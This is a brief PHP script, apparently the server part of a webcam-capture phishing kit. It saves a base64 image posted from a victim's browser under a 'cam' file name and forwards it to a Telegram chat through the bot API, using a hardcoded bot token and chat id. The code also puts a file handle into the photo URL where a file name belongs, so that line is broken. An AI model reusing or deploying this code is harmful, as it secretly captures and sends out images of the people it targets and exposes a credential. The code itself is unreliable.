<?php

$date = date('dMYHis');
$imageData=$_POST['cat'];


$filteredData=substr($imageData, strpos($imageData, ",")+1);
$unencodedData=base64_decode($filteredData);
$fp = fopen( 'cam'.$date.'.png', 'wb' );
fwrite( $fp, $unencodedData);
fclose( $fp );

file_get_contents("https://api.telegram.org/5607918899:AAEFtPgDVifrmZBCspYCEuVhfDBcH2BKrUc/sendPhoto?chat_id=1860763896&photo=https://lapreferida.cl/".$fp."&caption=radbon");
exit();
?>